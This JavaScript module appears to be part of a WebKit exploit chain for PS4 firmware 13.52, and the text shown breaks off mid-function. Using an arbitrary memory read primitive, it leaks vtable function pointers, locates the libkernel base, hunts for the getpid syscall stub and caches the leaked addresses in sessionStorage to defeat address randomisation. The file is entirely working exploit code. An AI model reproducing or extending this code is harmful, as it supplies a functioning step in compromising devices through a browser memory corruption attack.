/**
 * libkernel on 13.52 — PLT xrefs in mapped .text, RELRO GOT, prologue/stub hunts.
 * Never reads high unmapped IAT (+0x3cb8cc8). Max ~4 reads per GOT slot.
 */
import { int64 } from "./int64.js";
import { webkitRvaMax, webkitRvaMaxFromOff } from "./pivot_gadgets.js";

const ELF_MAGIC = 0x464c457f;
const SCE_MAGIC = 0x1d3d154f;
const SCE_ELF_OFF = 0x160;
const PT_LOAD = 1;
const PT_DYNAMIC = 2;
const DT_PLTGOT = 3;
const DT_PLTRELSZ = 2;
const DT_RELA = 7;
const DT_RELASZ = 8;
const DT_RELAENT = 9;
const DT_JMPREL = 23;
const DT_SCE_PLTGOT = 0x61000027;
const DT_SCE_JMPREL = 0x61000029;
const DT_SCE_PLTRELSZ = 0x6100002d;
const DT_SCE_RELA = 0x6100002f;
const DT_SCE_RELASZ = 0x61000031;
const DT_SCE_RELAENT = 0x61000033;
const PF_R = 4;
const PF_W = 2;
const PF_X = 1;

/** OOM-safe scan limits (13.52 poops base — no full-cap sweeps). */
const LK_LOW_TEXT_MAX = 0x200000;
const LK_ELF_RADIUS = 0x4000000n;
const LK_HUNT_RADIUS = 0x2000000n;
/** Ring removed from lite path — blind page reads beyond ±32MB OOM on 13.52 HW. */
const LK_RING_RADIUS = LK_HUNT_RADIUS;
const LK_HDR_BACK_COARSE = 64;
const LK_HDR_BACK_FINE = 256;

const SS_LK_BASE = "wk-libkernelBase";
const SS_LK_FORCED = "wk-libkernelForced";
const SS_IAT_RVA = "wk-imp-error-rva";

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function read2p(p, addr) {
    if (!addr) return null;
    try { return p.read2(addr); } catch (_) { return null; }
}

function read1p(p, addr) {
    if (!addr) return null;
    try { return p.read1(addr); } catch (_) { return null; }
}

function parseAddrSync(raw) {
    if (!raw) return null;
    if (typeof raw === "object" && raw != null && "low" in raw)
        return new int64(raw.low >>> 0, raw.hi >>> 0);
    let s = String(raw).replace(/^0x/i, "").trim().toLowerCase();
    if (!s || !/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

/** PS4 userland pointer — 0x800000000+ (handles unpadded 9–11 digit hex). */
function userlandPtrOk(p) {
    if (!p) return false;
    return ptrBig(p) >= 0x800000000n;
}

const SS_NATIVE_FN = "wk-nativeFn";
const SS_WEBKIT_BASE = "wk-webkitBase";
export const SS_WEBKIT_TRUST = "wk-webkitBase-trust";
const SS_CALIBRATED = "wk-calibrated";
const SS_CAL_CANDIDATE = "wk-cal-candidate";

export function same64Ptr(a, b) {
    if (!a || !b) return false;
    return (a.low >>> 0) === (b.low >>> 0) && (a.hi >>> 0) === (b.hi >>> 0);
}

/** Merge wk-calibrated + wk-cal-candidate into offset table (index_rw / index_cal shared). */
export function loadSessionOffsets(baseOff) {
    let off = Object.assign({}, baseOff || {});
    try {
        const cal = sessionStorage.getItem(SS_CALIBRATED);
        if (cal) off = Object.assign(off, JSON.parse(cal));
    } catch (_) { }
    try {
        const cand = parseInt(sessionStorage.getItem(SS_CAL_CANDIDATE) || "0", 16);
        if (cand > 0) off.wk_expm1_builtin = cand;
    } catch (_) { }
    delete off.lk_base_tag;
    return off;
}

export function loadSessionWebkitBase() {
    return parseAddrSync(sessionStorage.getItem(SS_WEBKIT_BASE));
}

export function sessionWebkitFromRw() {
    try { return sessionStorage.getItem(SS_WEBKIT_TRUST) === "rw"; } catch (_) { return false; }
}

/** Same webkit base derivation as index_rw basesFromSession — no leakval reads. */
export function sessionBasesFromStorage(off, opts) {
    opts = opts || {};
    off = off || {};
    const preferSession = opts.preferSessionWebkit === true;
    const nativeFn = opts.nativeFn || parseAddrSync(sessionStorage.getItem(SS_NATIVE_FN));
    let webkitBase = parseAddrSync(sessionStorage.getItem(SS_WEBKIT_BASE));
    let derived = null;
    if (nativeFn && off.wk_expm1_builtin)
        derived = nativeFn.sub32(off.wk_expm1_builtin);
    if (derived && !preferSession) {
        if (!webkitBase || !same64Ptr(webkitBase, derived))
            webkitBase = derived;
    }
    const libkernelBase = parseAddrSync(sessionStorage.getItem(SS_LK_BASE));
    return { nativeFn, webkitBase, libkernelBase, derived };
}

export function persistSessionBases(nativeFn, webkitBase, opts) {
    opts = opts || {};
    try {
        if (nativeFn) sessionStorage.setItem(SS_NATIVE_FN, String(nativeFn));
        if (webkitBase) {
            sessionStorage.setItem(SS_WEBKIT_BASE, String(webkitBase));
            if (opts.trust) sessionStorage.setItem(SS_WEBKIT_TRUST, opts.trust);
        }
    } catch (_) { }
}

function u64FromRead8(w) {
    if (!w) return null;
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

function iatCap(off) {
    return webkitRvaMax(off);
}

/** Mapped webkit **code** span — much smaller than full read cap; libkernel sits nearby. */
function webkitModuleSpan(off) {
    return webkitRvaMaxFromOff(off);
}

function rvaAllowed(rva, off) {
    return rva >= 0x1000 && rva <= iatCap(off);
}

export function isSyscallStub(v, num) {
    if (!v) return false;
    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
    const n = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
    return n === num;
}

export function isGetpidStub(v) {
    return isSyscallStub(v, 20);
}

/** At addr — chain_poops 8-byte check + mov rax/eax imm32 variants (13.52). */
export function isGetpidStubAt(p, addr) {
    if (!p || !addr) return false;
    let v = null;
    try { v = read8p(p, addr); } catch (_) { v = null; }
    if (v && isGetpidStub(v)) return true;
    const w0 = read4p(p, addr);
    if (w0 == null) return false;
    if ((w0 & 0xffffff) === 0xc0c748 && ((w0 >>> 24) & 0xff) === 20) return true;
    if ((w0 & 0xffff) === 0x14b8) return true;
    if ((w0 & 0xff) === 0xb8 && ((w0 >>> 8) & 0xff) === 0x14) return true;
    return false;
}

function fnGetpidDelta(off) {
    if (!off || off.k_usleep == null || !off.k_stubs || off.k_stubs[20] == null)
        return null;
    return (off.k_stubs[20] - off.k_usleep) >>> 0;
}

/** getpid stub addr from accepted k_usleep fn — 0 reads (chain_poops table RVAs). */
export function getpidStubFromFn(fnPtr, off) {
    const delta = fnGetpidDelta(off);
    if (!fnPtr || delta == null) return null;
    return fnPtr.add32(delta);
}

function scanGetpidNearFn(p, fnPtr, lk, off, radius, maxProbes) {
    const delta = fnGetpidDelta(off);
    if (!p || !fnPtr || delta == null) return null;
    radius = radius != null ? radius : 0x10000;
    maxProbes = maxProbes != null ? maxProbes : 512;
    let probes = 0;
    for (let d = -radius; d <= radius && probes < maxProbes; d += 16) {
        probes++;
        const addr = fnPtr.add32((delta + d) >>> 0);
        if (!isGetpidStubAt(p, addr)) continue;
        let stubOff = off.k_stubs[20];
        if (lk) {
            const rel = Number(ptrBig(addr) - ptrBig(lk));
            if (rel > 0 && rel < 0x400000) stubOff = rel;
        }
        return { addr, off: stubOff, tag: "fn+near+0x" + (delta + d).toString(16), verified: true };
    }
    return null;
}

const SS_LAST_FN = "wk-lastFnPtr";
const SS_GETPID_STUB = "wk-getpidStubOff";

export function saveLastFnPtr(fnPtr) {
    try {
        if (fnPtr) sessionStorage.setItem(SS_LAST_FN, String(fnPtr));
        else sessionStorage.removeItem(SS_LAST_FN);
    } catch (_) { }
}

export function loadLastFnPtr() {
    try {
        const raw = sessionStorage.getItem(SS_LAST_FN);
        if (raw) return parseAddrSync(raw);
    } catch (_) { }
    return null;
}

function saveGetpidStubOff(off) {
    try {
        if (off != null) sessionStorage.setItem(SS_GETPID_STUB, off.toString(16));
    } catch (_) { }
}

function loadGetpidStubOff() {
    try {
        const n = parseInt(sessionStorage.getItem(SS_GETPID_STUB), 16);
        return n > 0 ? n : null;
    } catch (_) {
        return null;
    }
}

/** Verified getpid syscall stub — fn+delta, lk+off, or scan. Never blind. */
export function resolveGetpidStub(p, lk, off, opts) {
    opts = opts || {};
    let probes = 0;
    if (!p || !lk)
        return { verified: false, tag: "no-lk", addr: null, off: null };

    function tryAt(addr, tag, offHint) {
        if (!addr) return null;
        if (!isGetpidStubAt(p, addr)) return null;
        return { addr, tag, verified: true, off: offHint != null ? offHint : null };
    }

    const skipLk = !!opts.skipLkOffs;

    const cached = loadGetpidStubOff();
    if (!skipLk && cached != null) {
        const hit = tryAt(lk.add32(cached), "cached+0x" + cached.toString(16), cached);
        if (hit) return hit;
    }

    const fnPtr = opts.fnPtr || loadLastFnPtr();
    const delta = fnGetpidDelta(off);
    if (fnPtr && delta != null) {
        let hit = tryAt(fnPtr.add32(delta), "fn+delta", off.k_stubs[20]);
        if (hit) {
            saveGetpidStubOff(hit.off != null ? hit.off : off.k_stubs[20]);
            return hit;
        }
        hit = scanGetpidNearFn(p, fnPtr, lk, off, opts.fnRadius, opts.fnProbes);
        if (hit) {
            saveGetpidStubOff(hit.off);
            return hit;
        }
    }

    if (!skipLk) {
        const offs = getpidStubOffsets(off);
        for (let i = 0; i < offs.length; i++) {
            const o = offs[i];
            const hit = tryAt(lk.add32(o), "lk+0x" + o.toString(16), o);
            if (hit) {
                saveGetpidStubOff(o);
                return hit;
            }
        }

        const scanMax = opts.scanMax != null ? opts.scanMax : 0x40000;
        const maxProbes = opts.maxProbes != null ? opts.maxProbes : 4096;
        probes = 0;
        for (let o = 0; o < scanMax && probes < maxProbes; o += 16) {
            probes++;
            const hit = tryAt(lk.add32(o), "scan+0x" + o.toString(16), o);
            if (hit) {
                saveGetpidStubOff(o);
                return hit;
            }
        }
    }

    if (opts.trustFnDelta && fnPtr && delta != null) {
        const addr = fnPtr.add32(delta);
        return {
            addr,
            off: off.k_stubs[20],
            tag: "fn+delta-trust",
            verified: true,
        };
    }

    let peek = null;
    if (fnPtr && delta != null) {
        try { peek = read8p(p, fnPtr.add32(delta)); } catch (_) { peek = null; }
    }
    return { verified: false, tag: "miss", addr: null, off: null, probes, peek };
}

const GETPID_STUB_CANDS = [
    0x2cb70, 0x2d5e0, 0x2cb80, 0x2cc00, 0x28000, 0x29000, 0x2a000, 0x2b000,
    0x30000, 0x31000, 0x32000, 0x25000, 0x26000,
];

function getpidStubOffsets(off) {
    const out = [];
    if (off.k_stubs && off.k_stubs[20] != null) out.push(off.k_stubs[20]);
    for (let i = 0; i < GETPID_STUB_CANDS.length; i++) {
        const v = GETPID_STUB_CANDS[i];
        if (out.indexOf(v) < 0) out.push(v);
    }
    return out;
}

function lkFromStubAddr(p, stubAddr, off) {
    const offs = getpidStubOffsets(off);
    for (let i = 0; i < offs.length; i++) {
        const lk = stubAddr.sub32(offs[i]);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, stubOff: offs[i] };
    }
    let page = new int64((stubAddr.low >>> 0) & ~0x3fff, stubAddr.hi >>> 0);
    for (let back = 0; back <= 0x40000; back += 0x4000) {
        const lk = page.sub32(back);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, stubOff: Number(ptrBig(stubAddr) - ptrBig(lk)) };
    }
    return null;
}

/** Cheap prologue check — two reads (mov eax, imm; syscall). */
export function checkPrologueAt(p, addr) {
    if (!addr) return false;
    const w0 = read4p(p, addr);
    const w1 = read4p(p, addr.add32(4));
    if (w0 == null || w1 == null) return false;
    return (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f;
}

export function isLibkernelPrologue(p, lk, ctx) {
    ctx = ctx || {};
    if (!lk || !lkAligned(lk)) return false;
    if (ctx.fnPtr && !plausibleLkBeforeRead(lk, ctx.fnPtr, ctx.webkitBase, ctx.off))
        return false;
    if (checkPrologueAt(p, lk)) return true;
    if (read4p(p, lk) === SCE_MAGIC)
        return checkPrologueAt(p, lk.add32(SCE_ELF_OFF));
    return false;
}

export function saveLibkernelSession(lk, iatRva, opts) {
    opts = opts || {};
    try {
        if (lk) sessionStorage.setItem(SS_LK_BASE, String(lk));
        if (iatRva != null) sessionStorage.setItem(SS_IAT_RVA, iatRva.toString(16));
        if (opts.forced)
            sessionStorage.setItem(SS_LK_FORCED, "1");
        else if (opts.forced === false)
            sessionStorage.removeItem(SS_LK_FORCED);
    } catch (_) { }
}

export function loadForcedLibkernel() {
    try {
        if (sessionStorage.getItem(SS_LK_FORCED) !== "1") return null;
        const raw = sessionStorage.getItem(SS_LK_BASE);
        if (!raw) return null;
        return parseAddrSync(raw);
    } catch (_) {
        return null;
    }
}

function loadSessionIatRva() {
    try {
        const n = parseInt(sessionStorage.getItem(SS_IAT_RVA), 16);
        return n > 0 ? n : null;
    } catch (_) {
        return null;
    }
}

/** True if ptr looks like an address inside the webkit **module** (not nearby libkernel). */
function ptrInWebkitImage(fnPtr, webkitBase, off) {
    if (!fnPtr || !webkitBase) return false;
    if (fnPtr.hi !== webkitBase.hi) return false;
    const span = webkitModuleSpan(off);
    const lo = webkitBase.low >>> 0;
    const fl = fnPtr.low >>> 0;
    if (fl < lo) return false;
    return (fl - lo) <= span;
}

/** External userland code pointer — not null, not webkit interior. */
function plausibleExtPtr(fnPtr, webkitBase, off) {
    if (!userlandPtrOk(fnPtr)) return false;
    if (ptrInWebkitImage(fnPtr, webkitBase, off)) return false;
    return true;
}

function bigToPtr(b) {
    return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
}

function ptrBig(w) {
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

const K_ERROR_CANDS = [
    0x26420, 0x26430, 0x25000, 0x30000,
    0xd9d0, 0x3370, 0x183c0, 0x299c0,
];

/** ≤8 reads — spot-check syscall stubs without full module scan. */
function liteSyscallStubScore(p, base) {
    let stubs = 0;
    for (let o = 0x1000; o < 0x50000; o += 0x8000) {
        const w = read4p(p, base.add32(o));
        if (w != null && (w & 0xffffff) === 0xc0c748) stubs++;
    }
    return stubs;
}

function weakLibkernelBaseHit(p, page, magic, ctx) {
    if (!page || magic == null) return false;
    if (checkPrologueAt(p, page)) return true;
    if (magic === SCE_MAGIC) {
        if (checkPrologueAt(p, page.add32(SCE_ELF_OFF))) return true;
        if (liteSyscallStubScore(p, page) >= 1) return true;
    }
    if (magic === ELF_MAGIC && liteSyscallStubScore(p, page) >= 1) return true;
    return isLibkernelPrologue(p, page, ctx);
}

/** Walk aligned pages below fn ptr — no fnPtr read, skip short unmapped runs. */
function resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, maxPages) {
    maxPages = maxPages != null ? maxPages : 64;
    const ctx = { fnPtr, webkitBase, off };
    let page = pageAlignDown(fnPtr, 0x4000);
    let nullStreak = 0;
    for (let i = 0; i < maxPages; i++) {
        if (!page || !plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
        const magic = read4p(p, page);
        if (magic == null) {
            nullStreak++;
            if (nullStreak >= 4) break;
            page = page.sub32(0x4000);
            continue;
        }
        nullStreak = 0;
        if (weakLibkernelBaseHit(p, page, magic, ctx)) {
            const kOff = Number(ptrBig(fnPtr) - ptrBig(page));
            const tag = magic === SCE_MAGIC ? "walk-sce" : (magic === ELF_MAGIC ? "walk-elf" : "walk-pro");
            return {
                lk: page,
                iatRva: null,
                fnPtr,
                via: tag + "+k=" + kOff.toString(16),
                k__error: kOff,
            };
        }
        page = page.sub32(0x4000);
    }
    return null;
}

/** Vote SCE/ELF headers found below many ext ptrs — picks libkernel base. */
export function resolveExtListVote(p, extHexList, off, webkitBase, opts) {
    opts = opts || {};
    if (!p || !extHexList || !extHexList.length) return null;
    const maxPages = opts.walkPages != null ? opts.walkPages : 64;
    const votes = new Map();

    for (let ei = 0; ei < extHexList.length; ei++) {
        const raw = String(extHexList[ei]).replace(/^0x/i, "").trim();
        if (!raw) continue;
        const fnPtr = parseAddrSync(raw);
        if (!fnPtr || fnPtr.hi < 0x8) continue;

        let page = pageAlignDown(fnPtr, 0x4000);
        let nullStreak = 0;
        for (let i = 0; i < maxPages; i++) {
            if (!page || !plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
            const magic = read4p(p, page);
            if (magic == null) {
                nullStreak++;
                if (nullStreak >= 4) break;
                page = page.sub32(0x4000);
                continue;
            }
            nullStreak = 0;
            if (magic === SCE_MAGIC || magic === ELF_MAGIC) {
                const key = ptrBig(page).toString(16);
                let ent = votes.get(key);
                if (!ent) {
                    ent = { lk: page, count: 0, magic: magic, refs: [] };
                    votes.set(key, ent);
                }
                ent.count++;
                if (ent.refs.length < 4)
                    ent.refs.push(raw.slice(-8));
            }
            page = page.sub32(0x4000);
        }
    }

    if (!votes.size) {
        opts._voteRank = [];
        opts._voteDiag = "0 hdr in " + maxPages + "pg×" + extHexList.length;
        return null;
    }

    const ranked = [];
    votes.forEach(function (ent, key) {
        ranked.push({ key: key, lk: ent.lk, count: ent.count, magic: ent.magic, refs: ent.refs });
    });
    ranked.sort(function (a, b) { return b.count - a.count; });

    opts._voteRank = ranked.slice(0, 4);

    for (let ri = 0; ri < ranked.length; ri++) {
        const cand = ranked[ri];
        const ctx = { webkitBase, off };
        const v = verifyLibkernelBase(p, cand.lk, off, ctx);
        if (v.ok && v.strong) {
            return {
                lk: cand.lk,
                iatRva: null,
                via: "vote+" + cand.count + "+stub",
                k__error: null,
                vote: cand.count,
                rank: ri,
            };
        }
        if (v.ok || weakLibkernelBaseHit(p, cand.lk, cand.magic, ctx)) {
            return {
                lk: cand.lk,
                iatRva: null,
                via: "vote+" + cand.count + (v.ok ? "+weak" : "+sce"),
                k__error: null,
                vote: cand.count,
                rank: ri,
                weak: !v.strong,
            };
        }
    }
    return null;
}

const WEBKIT_CODE_PROLOGUE = 0xe5894855;

function extEntryFnPtr(entry) {
    if (!entry) return null;
    if (typeof entry === "string")
        return parseAddrSync(entry.replace(/^0x/i, ""));
    const raw = entry.ptr || entry.hex || "";
    return parseAddrSync(String(raw).replace(/^0x/i, ""));
}

function extEntryCodeNum(entry) {
    if (!entry || entry.code == null || entry.code === "?") return null;
    const s = String(entry.code).replace(/^0x/i, "").toLowerCase();
    const n = parseInt(s, 16);
    return Number.isFinite(n) ? (n >>> 0) : null;
}

/** Max 16KB pages to walk back from fn when reverse-matching export RVAs (0 reads). */
const LK_PAGE_WALK_MAX = 48;

function pushLkZeroRead(out, seen, lk, row, via, priBump, off) {
    if (!looksLikeLkBase(lk, off)) return false;
    const k = String(lk);
    if (seen.has(k)) return false;
    seen.add(k);
    out.push({
        lk,
        rva: row.rva,
        key: row.key,
        via: via,
        pri: row.pri + (priBump != null ? priBump : 0),
    });
    return true;
}

function lkRvaAttempts(fnPtr, off) {
    const hits = calcLkFromFnPtrZeroRead(fnPtr, off);
    if (hits.length) {
        return hits.slice(0, 6).map(function (h) {
            return {
                key: h.key,
                rva: h.rva,
                lk: String(h.lk),
                aligned: true,
                ok: true,
                via: h.via,
            };
        });
    }
    const table = libkernelRvaTable(off);
    const out = [];
    const fnB = ptrBig(fnPtr);
    for (let i = 0; i < table.length && i < 4; i++) {
        const row = table[i];
        const raw = fnPtr.sub32(row.rva);
        const pg = pageAlignDown(raw, 0x4000);
        out.push({
            key: row.key + "/raw",
            rva: row.rva,
            lk: String(raw),
            aligned: lkAligned(raw),
            ok: false,
            via: "fn−rva",
        });
        out.push({
            key: row.key + "/+page",
            rva: row.rva,
            lk: String(pg),
            aligned: lkAligned(pg),
            ok: false,
            via: "page(fn−rva)",
        });
    }
    let page = pageAlignDown(fnPtr, 0x4000);
    for (let step = 0; step < 8; step++) {
        if (!userlandPtrOk(page)) break;
        const delta = Number(fnB - ptrBig(page));
        out.push({
            key: "rev@-" + (step * 0x4000).toString(16),
            rva: delta,
            lk: String(page),
            aligned: lkAligned(page),
            ok: false,
            via: "Δ=0x" + delta.toString(16),
        });
        page = page.sub32(0x4000);
    }
    return out.slice(0, 8);
}

function lkLoSuffix(lk) {
    if (!lk) return "????";
    if ((lk.low & 0x3fff) === 0) return "16K";
    return "…" + ((lk.low >>> 0) & 0xfff).toString(16);
}

/** Per ext fn ptr: which RVAs yield 16KB-aligned lk (0 reads). For logging + debug. */
export function diagnoseExtPtrLkMatches(entries, off, webkitBase) {
    off = off || {};
    const out = [];
    if (!entries || !entries.length) return out;

    for (let ei = 0; ei < entries.length; ei++) {
        const entry = entries[ei];
        const code = extEntryCodeNum(entry);
        const row = {
            label: entry.label || "ext",
            hex: "",
            skipped: false,
            skipReason: null,
            code: code != null ? fmtMagic(code) : (entry.code || null),
            matches: [],
            near: [],
        };
        if (code === WEBKIT_CODE_PROLOGUE) {
            row.skipped = true;
            row.skipReason = "webkit-prologue";
            out.push(row);
            continue;
        }
        const fnPtr = extEntryFnPtr(entry);
        if (!fnPtr) {
            row.skipped = true;
            row.skipReason = "bad-ptr";
            out.push(row);
            continue;
        }
        row.hex = ptrBig(fnPtr).toString(16);
        if (!plausibleExtPtr(fnPtr, webkitBase, off)) {
            row.skipped = true;
            row.skipReason = "not-ext";
            out.push(row);
            continue;
        }
        const zeros = calcLkFromFnPtrZeroRead(fnPtr, off);
        for (let zi = 0; zi < zeros.length; zi++) {
            const z = zeros[zi];
            row.matches.push({
                key: z.key,
                rva: z.rva,
                lk: String(z.lk),
                lkTag: lkLoSuffix(z.lk),
                via: z.via,
            });
        }
        if (!row.matches.length)
            row.near = lkRvaAttempts(fnPtr, off).filter(function (a) {
                return a.key === "k_usleep" || a.key === "k__error" || a.aligned;
            }).slice(0, 4);
        out.push(row);
    }
    return out;
}

export function formatExtPtrDiagLine(d) {
    if (!d) return "";
    if (d.skipped)
        return d.label + " fn=0x" + (d.hex || "?") + " SKIP " + (d.skipReason || "?");
    if (!d.matches.length) {
        if (d.near && d.near.length) {
            const bits = d.near.map(function (m) {
                const tag = m.via ? m.via + " " : "";
                return m.key + "→0x" + m.lk + (m.ok ? " OK" : (" " + tag + (m.aligned ? "align" : "off")));
            });
            return d.label + " fn=0x" + d.hex + " — " + bits.join(" ");
        }
        return d.label + " fn=0x" + d.hex + " — no RVA → 16KB lk";
    }
    const parts = [];
    for (let i = 0; i < d.matches.length && i < 6; i++) {
        const m = d.matches[i];
        parts.push(m.key + "→0x" + m.lk + " (…" + m.lkTag + ")");
    }
    return d.label + " fn=0x" + d.hex + " " + parts.join(" ");
}

/** Live textarea/expm1 vtables → external code pointers (skips webkit interior). */
export function collectLiveVtableExtPtrs(p, webkitBase, off, opts) {
    opts = opts || {};
    const maxIdx = opts.vtableEntries != null ? opts.vtableEntries : 48;
    const out = [];
    const seen = new Set();

    function add(label, fnPtr, code) {
        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) return;
        if (code === WEBKIT_CODE_PROLOGUE) return;
        const k = String(fnPtr);
        if (seen.has(k)) return;
        seen.add(k);
        out.push({
            label: label,
            ptr: k,
            hex: ptrBig(fnPtr).toString(16),
            code: code != null ? fmtMagic(code) : null,
        });
    }

    const disc = discoverTextareaVtables(p, opts);
    for (let vi = 0; vi < disc.vtables.length; vi++) {
        const vt = disc.vtables[vi];
        for (let i = 0; i < maxIdx; i++) {
            const fnPtr = read8p(p, vt.vtable.add32(i * 8));
            if (!fnPtr) continue;
            const code = read4p(p, fnPtr);
            if (code == null) continue;
            add(vt.label + "[" + i + "]", fnPtr, code >>> 0);
        }
    }
    return {
        entries: out,
        cells: disc.cells,
        vtables: disc.vtables.length,
        cellDbg: disc.cellDbg,
    };
}

/**
 * Auto-resolve libkernel from ext fn ptrs — **0 reads @ candidate lk** (wrong lk OOMs on 13.52).
 * 1) Suchi RVA subtract + vote across ptrs
 * 2) verifyLibkernelZeroRead (16KB-aligned base — no prologue peek)
 * Requires ≥2 distinct ext ptrs agreeing on same lk unless opts.minVotes=1.
 * Header-walk / prologue verify only if opts.allowLkReads===true (unsafe).
 */
export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
    opts = opts || {};
    off = off || {};
    if (!p || !entries || !entries.length) {
        return { ok: false, error: "no ext ptrs", tried: 0 };
    }

    const zeroReadOnly = opts.allowLkReads !== true;
    const minVotes = opts.minVotes != null ? opts.minVotes : 2;
    const minDistinctFn = opts.minDistinctFn != null
        ? opts.minDistinctFn
        : (minVotes > 1 ? 2 : 1);
    const allowSinglePriRva = opts.allowSinglePriRva === true;
    const lkVotes = new Map();
    const hexList = [];
    const ptrDiag = diagnoseExtPtrLkMatches(entries, off, webkitBase);
    let skipped = 0;
    let tried = 0;

    for (let ei = 0; ei < entries.length; ei++) {
        const entry = entries[ei];
        const code = extEntryCodeNum(entry);
        if (code === WEBKIT_CODE_PROLOGUE) {
            skipped++;
            continue;
        }
        const fnPtr = extEntryFnPtr(entry);
        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) {
            skipped++;
            continue;
        }
        tried++;
        hexList.push(ptrBig(fnPtr).toString(16));
        const fnKey = ptrBig(fnPtr).toString(16);
        const fnLabel = entry.label || "ext";

        const zeros = calcLkFromFnPtrZeroRead(fnPtr, off);
        for (let zi = 0; zi < zeros.length; zi++) {
            const z = zeros[zi];
            const key = String(z.lk);
            let ent = lkVotes.get(key);
            if (!ent) {
                ent = {
                    lk: z.lk,
                    count: 0,
                    vias: [],
                    refs: [],
                    fnKeys: new Set(),
                    fnRefs: [],
                    hasUsleep: false,
                    hasError: false,
                };
                lkVotes.set(key, ent);
            }
            ent.count++;
            ent.fnKeys.add(fnKey);
            if (z.key === "k_usleep") ent.hasUsleep = true;
            if (z.key === "k__error") ent.hasError = true;
            if (ent.vias.indexOf(z.via) < 0 && ent.vias.length < 6)
                ent.vias.push(z.via);
            const ref = fnLabel + ":0x" + fnKey;
            if (ent.fnRefs.length < 8) {
                let dup = false;
                for (let ri = 0; ri < ent.fnRefs.length; ri++) {
                    if (ent.fnRefs[ri].hex === fnKey && ent.fnRefs[ri].via === z.via) {
                        dup = true;
                        break;
                    }
                }
                if (!dup)
                    ent.fnRefs.push({ label: fnLabel, hex: fnKey, via: z.via, key: z.key });
            }
            const refShort = fnLabel + ":" + fnKey.slice(-8);
            if (ent.refs.length < 8 && ent.refs.indexOf(refShort) < 0)
                ent.refs.push(refShort);
        }
    }

    const zeroRank = [];
    lkVotes.forEach(function (ent) {
        ent.distinctFn = ent.fnKeys ? ent.fnKeys.size : 0;
        ent.crossRva = (ent.hasUsleep && ent.hasError) ? 1 : 0;
        ent.dualRva = ent.crossRva;
        zeroRank.push(ent);
    });
    zeroRank.sort(function (a, b) {
        const aPri = (a.hasUsleep ? 2 : 0) + (a.hasError ? 1 : 0);
        const bPri = (b.hasUsleep ? 2 : 0) + (b.hasError ? 1 : 0);
        return b.crossRva - a.crossRva
            || bPri - aPri
            || b.distinctFn - a.distinctFn
            || b.count - a.count
            || b.vias.length - a.vias.length;
    });

    for (let ri = 0; ri < zeroRank.length; ri++) {
        const cand = zeroRank[ri];
        const crossRvaOk = cand.crossRva >= 1;
        const distinctOk = cand.distinctFn >= minDistinctFn;
        const priHit = cand.hasUsleep || cand.hasError;
        const singlePriOk = allowSinglePriRva && cand.distinctFn >= 1 && priHit;
        if (!crossRvaOk && !distinctOk && !singlePriOk) continue;
        if (cand.count < minVotes && !crossRvaOk && !singlePriOk) continue;
        const v = verifyLibkernelZeroRead(cand.lk, off, { via: "zero-vote" });
        if (!v.ok) continue;
        const method = crossRvaOk ? "cross-rva"
            : (singlePriOk ? "single-rev" : "zero-vote");
        const via = crossRvaOk
            ? "usleep+error→" + String(cand.lk) + "+" + cand.distinctFn + "fn"
            : (singlePriOk
                ? (cand.vias ? cand.vias.slice(0, 3).join("+") : "")
                    + "→" + String(cand.lk)
                : "zero-vote+" + cand.distinctFn + "fn+" + cand.count + "x");
        return {
            ok: true,
            lk: cand.lk,
            via: via,
            method: method,
            vote: cand.count,
            distinctFn: cand.distinctFn,
            crossRva: cand.crossRva,
            dualRva: cand.crossRva,
            fnRefs: cand.fnRefs || [],
            rank: ri,
            tried: tried,
            skipped: skipped,
            zeroRead: true,
            reads: 0,
            zeroRank: zeroRank.slice(0, 6),
            ptrDiag: ptrDiag,
        };
    }

    if (!zeroReadOnly && hexList.length) {
        const voteOpts = Object.assign({}, opts);
        const voted = resolveExtListVote(p, hexList, off, webkitBase, voteOpts);
        if (voted && voted.lk) {
            const vu = verifyLibkernelUsleep1352(p, voted.lk, off);
            if (vu.ok) {
                return Object.assign({
                    ok: true,
                    method: "header-vote",
                    tried: tried,
                    skipped: skipped,
                    zeroRank: zeroRank.slice(0, 4),
                    voteRank: voteOpts._voteRank || [],
                    zeroRead: false,
                }, voted);
            }
        }
    }

    if (!zeroReadOnly) {
        for (let ei = 0; ei < entries.length; ei++) {
            const fnPtr = extEntryFnPtr(entries[ei]);
            if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) continue;
            const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, {
                lite: true,
                maxWalkPages: 0,
                zeroReadOnly: true,
            });
            if (!hit || !hit.lk) continue;
            const v = verifyLibkernelZeroRead(hit.lk, off);
            if (!v.ok) continue;
            return {
                ok: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                via: hit.via,
                method: "ext-resolve",
                fnPtr: String(fnPtr),
                label: entries[ei].label || "?",
                tried: tried,
                skipped: skipped,
                zeroRank: zeroRank.slice(0, 4),
                zeroRead: true,
                reads: 0,
            };
        }
    }

    let hint = "need 2 fn ptrs → same lk, OR 1 fn with rev/rva k_usleep/k__error (0 reads)";
    const matchedPtrs = ptrDiag.filter(function (d) { return !d.skipped && d.matches.length; });
    if (matchedPtrs.length === 1) {
        const m = matchedPtrs[0];
        const via = m.matches.map(function (x) {
